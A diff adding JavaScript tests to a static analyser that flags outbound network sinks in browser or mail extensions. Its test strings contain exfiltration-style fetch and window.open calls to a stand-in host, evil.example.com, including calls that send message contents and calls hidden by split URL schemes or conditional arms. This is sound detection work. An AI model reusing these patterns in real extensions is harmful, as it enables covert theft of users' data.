@@ -118,6 +118,141 @@ test("a getURL(<relative>) destination is local, not an outbound sink", () => {
   }
 });
 
+// The one-step variable indirection resolves like the inline call: an
+// identifier bound once to getURL(<static relative>) is a local destination
+// (`const url = getURL("a.json"); fetch(url)`). A reassigned binding must NOT
+// resolve - the later value could be remote, so it stays conservatively
+// dynamic - and a shadowing local must not leak the outer binding's URL.
+test("a variable bound to getURL(<relative>) is local; reassignment is not", () => {
+  for (const code of [
+    'const url = browser.runtime.getURL("data.json"); fetch(url);',
+    "const api = globalThis.browser ?? globalThis.chrome;" +
+      ' const url = api.runtime.getURL("data.json"); fetch(url);',
+  ]) {
+    const hit = one(code);
+    assert.equal(hit.destClass, URL_CLASS.LOCAL, code);
+    assert.equal(hit.host, null, code);
+  }
+  const reassigned = one(
+    'let url = browser.runtime.getURL("data.json");' +
+      ' url = "https://evil.example.com/c"; fetch(url);'
+  );
+  assert.notEqual(reassigned.destClass, URL_CLASS.LOCAL);
+  const shadowed = one(
+    'const url = browser.runtime.getURL("data.json");' +
+      " function f(url) { fetch(url); } f(remote);"
+  );
+  assert.notEqual(shadowed.destClass, URL_CLASS.LOCAL);
+});
+
+// A conditional destination can take either arm at runtime, so the sink is judged
+// on ALL of them and the gravest one governs - an absolute URL in any arm is a
+// remote sink, never masked by a local-looking sibling. The arms are read wherever
+// they sit: standalone, nested for a third choice, inside a concatenation, wrapped
+// in getURL or written plainly, inline or held in a variable.
+test("a conditional destination is judged on every arm, gravest first", () => {
+  for (const code of [
+    'fetch(browser.runtime.getURL(c ? "a.json" : "https://evil.example.com/x"));',
+    'const url = browser.runtime.getURL(c ? "a.json" : "https://evil.example.com/x"); fetch(url);',
+    'fetch(browser.runtime.getURL(c ? "a.json" : d ? "b.json" : "https://evil.example.com/x"));',
+    'const url = browser.runtime.getURL(c ? "a.json" : d ? "b.json" : "https://evil.example.com/x"); fetch(url);',
+    'fetch(browser.runtime.getURL((c ? "a" : "https://evil.example.com/x") + ".json"));',
+    'const url = browser.runtime.getURL((c ? "a" : "https://evil.example.com/x") + ".json"); fetch(url);',
+    'fetch(c ? "a.json" : "https://evil.example.com/x");',
+  ]) {
+    const hit = one(code);
+    assert.notEqual(hit.destClass, URL_CLASS.LOCAL, code);
+    assert.equal(hit.destClass, URL_CLASS.REMOTE, code);
+    assert.equal(hit.host, "evil.example.com", code);
+  }
+});
+
+// Judging every arm must not cost the clean case: when they are all relative the
+// destination is local, and each arm keeps its own loopback downgrade - a loopback
+// arm is local on its own but never launders a remote sibling.
+test("a conditional destination whose arms are all local stays local", () => {
+  for (const code of [
+    'fetch(browser.runtime.getURL(dark ? "d.css" : "l.css"));',
+    'const url = browser.runtime.getURL(dark ? "d.css" : "l.css"); fetch(url);',
+    'fetch(c ? "http://127.0.0.1/x" : "http://localhost/y");',
+  ]) {
+    assert.equal(one(code).destClass, URL_CLASS.LOCAL, code);
+  }
+  const mixed = one(
+    'fetch(c ? "http://127.0.0.1/x" : "https://evil.example.com/y");'
+  );
+  assert.equal(mixed.destClass, URL_CLASS.REMOTE);
+  assert.equal(mixed.host, "evil.example.com");
+});
+
+// Each conditional multiplies the values an expression can take, so a chain of
+// them grows exponentially. Past the bound the destination is reported unresolved
+// rather than half-enumerated - a truncated value set would let the arm that was
+// dropped decide nothing, which is exactly the masking this resolution prevents.
+test("a destination with more values than the bound stays unresolved", () => {
+  const arms = ["ab", "cd", "ef", "gh", "ij", "kl"].map(
+    ([x, y], i) => `(v${i} ? "${x}" : "${y}")`
+  );
+  // Five arms -> 32 combinations, all relative: within the bound, so resolved.
+  assert.equal(
+    one(`fetch(${arms.slice(0, 5).join(" + ")});`).destClass,
+    URL_CLASS.LOCAL
+  );
+  // Six -> 64: over the bound, so unresolved rather than partially enumerated.
+  assert.equal(one(`fetch(${arms.join(" + ")});`).destClass, URL_CLASS.DYNAMIC);
+});
+
+// A scheme can be spelled across several pieces of a concatenation, so the static
+// run leading a dynamic URL is read whole rather than cut at its first piece - a
+// destination assembled as "htt" + "ps://host" or "/" + "/host" is remote, not the
+// relative-looking path its first piece resembles. This holds however the tail is
+// built, including one with too many values to enumerate.
+test("a scheme split across concatenated pieces is read whole", () => {
+  const remote = (code, host) => {
+    const hit = one(code);
+    assert.equal(hit.destClass, URL_CLASS.REMOTE, code);
+    assert.equal(hit.host, host, code);
+  };
+  remote(
+    'fetch("htt" + "ps://evil.example.com/x" + token);',
+    "evil.example.com"
+  );
+  remote('fetch("/" + "/evil.example.com/x" + token);', null);
+  const arms = ["ab", "cd", "ef", "gh", "ij", "kl"].map(
+    ([x, y], i) => `(v${i} ? "${x}" : "${y}")`
+  );
+  remote(`fetch("/" + "/evil.example.com/x" + ${arms.join(" + ")});`, null);
+  // A leading run that really is relative still classifies local: reading the
+  // whole run must not invent a scheme that is not there.
+  assert.equal(
+    one(`fetch("as" + "sets/i.png" + ${arms.join(" + ")});`).destClass,
+    URL_CLASS.LOCAL
+  );
+});
+
+// Among equally grave destinations the cleartext one governs, so a send that
+// travels unencrypted on one of its paths is reported as cleartext and the host
+// named is that path's.
+test("a conditional destination reports the cleartext arm among remote arms", () => {
+  for (const code of [
+    'fetch(c ? "https://evil.example.com/x" : "http://evil.example.com/x");',
+    'fetch(c ? "http://evil.example.com/x" : "https://evil.example.com/x");',
+  ]) {
+    const hit = one(code);
+    assert.equal(hit.cleartext, true, code);
+    assert.equal(hit.host, "evil.example.com", code);
+  }
+});
+
+// getURL with no argument mints the extension's own base URL - a local resource,
+// not an unresolved destination.
+test("a zero-argument getURL destination is local", () => {
+  assert.equal(
+    one("fetch(browser.runtime.getURL());").destClass,
+    URL_CLASS.LOCAL
+  );
+});
+
 // getURL does NOT force a sink local: an ABSOLUTE argument escapes the origin
 // (getURL("https://x") -> "https://x"), so fetch(getURL("https://evil")) must stay
 // a REMOTE sink - a remote/exfil URL wrapped in getURL is not masked.
@@ -128,6 +263,19 @@ test("a getURL(<absolute>) destination stays a remote sink", () => {
   assert.equal(abs.destClass, URL_CLASS.REMOTE);
   assert.equal(abs.host, "evil.example.com");
   assert.equal(abs.cleartext, false);
+  // The same holds through the one-step variable indirection: parking the
+  // getURL result in a binding must not launder an absolute argument into a
+  // local resource.
+  const viaVar = one(
+    'const url = browser.runtime.getURL("https://evil.example.com/c");' +
+      " fetch(url);"
+  );
+  assert.equal(viaVar.destClass, URL_CLASS.REMOTE);
+  assert.equal(viaVar.host, "evil.example.com");
+  const protoRel = one(
+    'const url = browser.runtime.getURL("//evil.example.com/c"); fetch(url);'
+  );
+  assert.equal(protoRel.destClass, URL_CLASS.REMOTE);
 });
 
 // Over-suppression guard: getURL resolution must not swallow a genuinely remote
@@ -233,6 +381,30 @@ test("window.open carrying a data-API call is a covert, data-bearing sink", () =
   const plain = one('window.open("https://evil.example.com/p");');
   assert.equal(plain.type, "window-open");
   assert.equal(plain.carriesData, false);
+});
+
+// The data-API call that makes a sink data-bearing is recognised through the
+// api-base index, so every spelling of the root reports the same evidence: the
+// bare name, a captured/feature-detected alias, and a root named on the global
+// object. A plain local that merely shares a root's name carries nothing.
+test("a data-API call is recognised through every spelling of its root", () => {
+  const body = (call) =>
+    one(`fetch("https://evil.example.com/x", {body: ${call}});`);
+  for (const call of [
+    "messenger.messages.getFull(1)",
+    "globalThis.messenger.messages.getFull(1)",
+    "window.browser.messages.getFull(1)",
+    "self.messenger.messages.getFull(1)",
+  ]) {
+    assert.equal(body(call).carriesData, true, call);
+  }
+  const aliased = one(
+    "const api = globalThis.browser ?? globalThis.chrome;" +
+      ' fetch("https://evil.example.com/x", {body: api.messages.getFull(1)});'
+  );
+  assert.equal(aliased.carriesData, true);
+  // A local object that happens to have a matching property name is not the API.
+  assert.equal(body("cfg.messages.getFull(1)").carriesData, false);
 });
 
 test("a location.href navigation carrying a data-API call is covert and data-bearing", () => {
